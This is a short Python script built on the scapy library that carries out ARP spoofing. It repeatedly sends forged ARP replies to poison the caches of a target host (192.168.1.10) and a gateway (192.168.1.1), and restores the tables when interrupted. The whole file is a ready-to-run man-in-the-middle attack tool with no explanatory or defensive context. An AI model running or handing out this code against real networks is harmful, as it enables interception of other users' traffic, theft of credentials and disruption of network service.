#!/usr/bin/env python3

from scapy.all import ARP, Ether, srp, send
import sys
import time

def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered = srp(arp_request, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if target_mac and host_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.10"
    host_ip = "192.168.1.1"

    try:
        print("Starting ARP spoofing...")
        while True:
            spoof(target_ip, host_ip)
            spoof(host_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring network...")
        restore(target_ip, host_ip)
        restore(host_ip, target_ip)
        print("Network restored.")
